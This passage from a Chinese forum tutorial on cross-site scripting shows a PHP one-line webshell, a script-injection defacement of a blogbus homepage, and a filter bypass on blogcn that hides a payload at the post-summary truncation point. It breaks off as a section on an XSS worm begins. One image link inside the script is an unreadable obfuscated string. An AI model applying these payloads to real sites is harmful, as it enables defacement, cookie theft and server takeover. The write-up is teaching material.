
360安全浏览器情况如图11所示：

![](https://bbs.kanxue.com/upload/attach/201011/124373_u8spefdus0vm6gu.jpg)

图11

世界之窗情况如图12所示：

![](https://bbs.kanxue.com/upload/attach/201011/124373_tudrjub6lmsmdnq.jpg)

图12

TT浏览器情况如图13所示：

![](https://bbs.kanxue.com/upload/attach/201011/124373_qg01t6rdfq0snra.jpg)

图13

Opera下直接给出警告如图14所示：

![](https://bbs.kanxue.com/upload/attach/201011/124373_kabj1cj6oxeyan1.jpg)

图14

当然，这些漏洞除了读取文件外，还可写入一句话木马`<?php eval($_POST[cmd])?>`，为进一步提权提供条件。

## 四、Hacking HomePage

相信对于很多初学Hack的朋友，都会对那一张张的黑页独有情钟，尤其是当前中美黑客大战中，中国人挂在白宫网站上黑页，让人至今记忆犹新！本节主要就是利用XSS来黑掉别人博客主页，但这里的黑页与入侵服务器来修改主页有很大区别，利用XSS来黑页其实并不是修改服务器上的页面，它只是通过JavaScript,CSS及其它WEB技术来修改页面。这主要就是通过注入js代码，然后在后台执行以达到盗取cookie或劫持浏览器的目的，这些代码往往都是一些HTML或JavaScript代码(往往是使用`InnerHTML`或者`document.write`命令来动态创建文本，图像及其它数据信息)。在本文编写过程中，我又发现了博客大巴上的几处跨站漏洞，就在“博客设置”中，这里我们就以其中“基础设置”下的“自定义header”一栏为例。我们先在向其写入下列语句：

```html
<script src ="http://localhost/1.js"></script>
```

接下来编写`1.js`代码：

```javascript
document.write("<center><h1><font color=#FF0000>Hacked By riusksk</font></h1></cneter>");
document.write("<center><h2><font color=#000000>Just for test !</font><h2></center><p><img src=579K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3k6A6L8r3g2J5i4K6u0W2j5X3I4G2k6$3u0#2M7#2)9J5k6h3y4G2L8g2)9J5c8U0j5J5x3K6x3^5y4U0q4Q4x3V1k6J5k6i4y4G2N6i4u0U0k6g2)9#2k6U0j5J5x3K6x3^5y4U0q4Q4y4h3j5I4x3U0R3K6y4U0M7%4x3o6b7@1K9g2)9J5k6h3A6H3k6#2)9J5y4X3N6@1i4K6y4n7i4K6t1$3L8s2c8Q4x3@1u0Q4x3V1k6H3i4K6t1$3k6%4c8Q4x3@1u0Q4x3U0k6D9N6q4)9K6b7Y4m8Q4x3U0k6Y4N6q4)9K6b7W2)9J5y4X3I4@1i4K6y4n7i4K6t1I4i4K6u0V1i4K6u0V1");
```

上面的`<!—`主要是用于将后面的页面内容注释掉，避免显示，但这在各浏览器中情况会有所不同，比如我在Chrome中可以起到此作用，但在其它浏览器达不到此效果了，得采用其它注释语句方可，或者先用`document.body.innerHTML = '';`来清空body主体中的html代码，然后再逐一利用`document.createElement`创建元素也是可行的。这里我是以Chrome作为测试用的浏览器，访问博客首页后结果如图15所示：

![](http://bbs.pediy.com/attachment.php?attachmentid=47358&d=1283788440)

图15

成功“黑掉”博客主页！

## 五、跨站中的“溢出攻击”

相信熟悉缓冲区溢出攻击的朋友，都知道其中的原理：通过向堆栈中填充过多的字节以覆盖返回地址，进而控制程序的执行流程。这里我要讲的XSS攻击方式与溢出有着类似的特点，在此我们以“中国博客网（blogcn.com）”为实例进行讲解。经过本人的多次测试，发现上面有着不少XSS漏洞，后来听从乱雪同志的建议，将阵地转移到blogbus，但正如上面所讲到的，结果还是漏洞一堆，看来很多技术人员把博客放在百度空间还是有一定道理，至少它比这些博客网站安全多了。现在回归正传，本节就以发表日志中存在的跨站漏洞为例。我们先像往常一样在日志中输入`<script>alert(“riusksk”)</script>`，发表后再查看日志时并未触发脚本，因为其中的`<`、`>`均被过滤掉了，如图16所示：

![](https://bbs.kanxue.com/upload/attach/201011/124373_dcn5glcgded04wd.jpg)

图16

通常`<>`被过滤掉，xss基本没多大希望了，很多人都会放弃掉了。但是经过本人多次的测试，发现当博客的内容显示方式被设置为“摘要”的时候，也就是如图17所示的情况：

![](https://bbs.kanxue.com/upload/attach/201011/124373_p6xjabno1e0xztt.jpg)

图17

在这种情况下，博客首页上面显示的文章均会只显示博文的前几行而已，如果此时我们的XSS语句刚好到达这个省略点时，那么它就会因被省略掉而未对其进行过滤，进而触发漏洞。当XSS语句刚好处于这个省略点时，它并未在页面中显示，但仍包含于网页之中。这个省略点就像溢出攻击的“溢出点（返回地址）”一样，通过填充数据到这个点即可触发漏洞。经过测试发现，当XSS语句处于第五行时就可触发漏洞。或者放在第三或四行，接着再在XSS语句后面写几行其它内容，同样也可达到执行脚本的目的。因此这里我们可以在日志中构造如下语句：

```text
AAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAA
<script>alert("riusksk")</script>
```

其中每行‘A’的个数不限，只要能凑足一行就行了，或者用其它数据填充也是一样的。我们在首页中试着看看效果：

![](https://bbs.kanxue.com/upload/attach/201011/124373_scumqfb2dobr0ao.jpg)

图18

正如图18所示，我们已经成功跨站了！再看下此时的源码情况，如图19所示：

![](https://bbs.kanxue.com/upload/attach/201011/124373_u0rdyv7mmegwxt1.jpg)

图19

很显然，处于省略点的XSS语句并没有经过过滤，这样我们就绕过了它的字符过滤保护！但是如果我们打开这篇博文并不能实现跨站，只有XSS语句处于省略部分时才可达到以上效果。Blogcn上面还有许多处XSS漏洞，但感觉这处的利用方法比较有趣，就提出来与大家分享。虽然这并不是真正意义上的溢出攻击，但如果你嵌入的真正用于溢出某ActiveX控件的代码，比如使用heap spray技术等等，还有之前出现的IE iframe溢出漏洞，利用这些漏洞也是可以实现真正意义上的溢出攻击的。

## 六、XSS Worm

随着WEB2.0时代的到来，而Ajax就是WEB2.0的标志性技术。AJAX即“Asynchronous JavaScript and XML”（异步JavaScript和XML)，AJAX并非缩写词，而是由Jesse James Gaiiett创造的名词，是指一种创建交互式网页应用的网页开发技术。Ajax的出现为XSS蠕虫的发展提供的很大的便利，也因此加速了xss worm技术的传播。这里我们就以之前爆发的Twitte蠕虫为例进行分析，这个XSS worm之前在我的博客上也有提到（）。该跨站漏洞主要出现在"Settings" 菜单下的 "Name"文本域以及"More info URL"文本域，是由一位来自美国纽约的17岁小伙子写的，当时他花了2小时就全搞定了。其源码分析如下：
